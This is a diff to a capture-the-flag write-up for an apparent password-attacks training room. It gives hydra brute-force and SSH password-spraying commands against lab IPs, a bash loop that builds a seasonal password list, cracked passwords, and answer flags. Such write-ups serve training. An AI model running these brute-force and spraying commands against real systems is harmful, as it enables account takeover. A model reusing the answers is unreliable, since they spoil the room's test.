@@ -51,3 +51,20 @@ Solution: john --wordlist=clinic_wordlist.lst --rules=single-extra -stdout > new
 To find the password : hydra -l burgess -P newdictionary.lst 10.10.126.195 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -v
 Password : OxytocinnicotyxO
 Use this password to login onto the link  and have flag.
+
+
+## Task - 9: Password spray attack 
+
+### The idea is to use different usernames but same password
+
+**Q: Perform a password spraying attack to get access to the SSH://10.10.20.91 server to read /etc/flag. What is the flag?**
+
+Answer: THM{a97a26e86d09388bbea148f4b870277d}
+
+Solution: you can Try the Password hint and Password is Fall2021@ 
+you can also create few passwords by this script 
+**for year in {2020..2021}; do for char in '@' '#' '$' '%' '^' '&' '*' '(' ')'; do echo "Fall${year}${char}"; done; done > password.txt**
+hydra -l usernames.txt -P password.txt ssh://10.10.20.91
+
+
+### Task - 10: Summary, just reading 
